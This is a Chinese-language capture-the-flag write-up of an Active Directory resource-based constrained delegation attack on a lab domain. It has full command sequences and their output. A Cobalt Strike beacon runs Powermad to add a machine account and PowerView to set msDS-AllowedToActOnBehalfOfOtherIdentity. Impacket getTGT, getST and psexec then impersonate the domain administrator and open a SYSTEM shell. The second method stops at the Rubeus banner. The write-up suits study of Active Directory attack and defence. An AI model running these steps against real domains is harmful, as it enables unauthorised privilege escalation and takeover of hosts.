### 优化后的文本

#### 用户权限分析
以下是关于用户 `usera` 对计算机账户 `USERA-PC` 的权限配置信息：

- **IsCallback**: False
- **OpaqueLength**: 0
- **AccessMask**: 32
- **SecurityIdentifier**: S-1-5-21-3860493963-3742860931-3732056798-1105
- **AceType**: AccessAllowedObject
- **AceFlags**: None
- **IsInherited**: False
- **InheritanceFlags**: None
- **PropagationFlags**: None
- **AuditFlags**: None
- **ObjectDN**: CN=USERA-PC,CN=Computers,DC=n1ctf,DC=lab
- **ObjectSID**: S-1-5-21-3860493963-3742860931-3732056798-1106
- **ActiveDirectoryRights**: Self
- **ObjectAceFlags**: ObjectAceTypePresent
- **ObjectAceType**: 72e39547-7b18-11d1-adef-00c04fd8d5cd
- **InheritedObjectAceType**: 00000000-0000-0000-0000-000000000000
- **BinaryLength**: 56
- **AceQualifier**: AccessAllowed

通过这些配置，可以看到用户 `usera` 对计算机账户 `USERA-PC` 拥有 `WriteProperty` 权限。

#### 域环境中的属性
在域环境中，有一个属性 `MachineAccountQuota`，允许用户在域中创建的计算机机器账户，默认值为10。计算机账户默认注册了 `RestrictedKrbHost/domain` 和 `HOST/domain` 这两个 SPN。因此，这里的配置符合我们的需求。

#### 创建机器用户
使用 `Powermad` 创建一个新的机器用户：
```powershell
beacon> shell powershell Import-Module ./Powermad.ps1;"New-MachineAccount -MachineAccount ha1 -Password $(ConvertTo-SecureString 'evil' -AsPlainText -Force)"
[*] Tasked beacon to run: powershell Import-Module ./Powermad.ps1;"New-MachineAccount -MachineAccount ha1 -Password $(ConvertTo-SecureString 'evil' -AsPlainText -Force)"
[+] host called home, sent: 174 bytes
[+] received output:
[+] Machine account ha1 added
```

#### 修改 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性
使用 `Powerview` 修改 `USERA-PC` 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性：
```powershell
shell powershell import-module ./powerview.ps1;"$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList 'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3860493963-3742860931-3732056798-1111)'; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer USERA-PC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose;"
```

#### 验证属性修改
验证是否成功添加 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性：
```powershell
beacon> shell powershell import-module ./powerview.ps1; Get-DomainComputer USERA-PC -Properties msds-allowedtoactonbehalfofotheridentity
[*] Tasked beacon to run: powershell import-module ./powerview.ps1; Get-DomainComputer USERA-PC -Properties msds-allowedtoactonbehalfofotheridentity
[+] host called home, sent: 153 bytes
[+] received output:
msds-allowedtoactonbehalfofotheridentity
----------------------------------------    {1, 0, 4, 128...}
```

### 方法1：利用资源约束委派
1. 使用 `ha1$` 模拟 `administrator` 获取票据并用 `psexec` 提权：
    ```bash
    ha1c9on@ha1c9ondeMacBook-Pro ~ % getTGT.py n1ctf.lab/ha1\$:evil -dc-ip 10.233.33.9
    Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation
    [*] Saving ticket in ha1$.ccache
    ha1c9on@ha1c9ondeMacBook-Pro ~ % export KRB5CCNAME=ha1\$.ccache
    ha1c9on@ha1c9ondeMacBook-Pro ~ % getST.py n1ctf.lab/ha1\$ -dc-ip 10.233.33.9 -spn HOST/USERA-PC -impersonate administrator -k -no-pass
    Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation
    [*] Using TGT from cache
    [*] Impersonating administrator
    [*] Requesting S4U2self
    [*] Requesting S4U2Proxy
    [*] Saving ticket in administrator.ccache
    ha1c9on@ha1c9ondeMacBook-Pro ~ % export KRB5CCNAME=administrator.ccache
    ha1c9on@ha1c9ondeMacBook-Pro ~ % psexec.py n1ctf.lab/administrator@usera-pc -k -no-pass -dc-ip 10.233.33.9
    Impacket v0.9.22.dev1 - Copyright 2020 SecureAuth Corporation
    [*] Requesting shares on usera-pc.....
    [*] Found writable share ADMIN$
    [*] Uploading file uNgdvAxj.exe
    [*] Opening SVCManager on usera-pc.....
    [*] Creating service bRYo on usera-pc.....
    [*] Starting service bRYo.....
    [!] Press help for extra shell commands
    Microsoft Windows [Version 10.0.17763.1339]
    (c) 2018 Microsoft Corporation. All rights reserved.
    C:\Windows\system32>hostname
    UserA-PC
    C:\Windows\system32>type c:\flag.txt
    n1ctf{El_Psy_Kongroo_Zp4du8O51YTgHrH284ea}
    ```

### 方法2：使用 Rubeus 生成哈希
```bash
beacon> shell Rubeus.exe hash /user:ha1 /password:evil /domain:n1ctf.lab
[*] Tasked beacon to run: Rubeus.exe hash /user:ha1 /password:evil /domain:n1ctf.lab
[+] host called home, sent: 89 bytes
[+] received output:
______ _
(_____ \ | |
_____) )_ _| |__ _____ _ _ ___
| __ /| | | | _ \| ___ | | | |/___)
| | \ \| |_| | |_) ) ____| |_| |___ |
|_| |_|____/|____/|_____)____/(___/)
```

通过以上步骤，我们成功地利用了用户的权限和域环境配置，实现了对目标计算机账户的控制。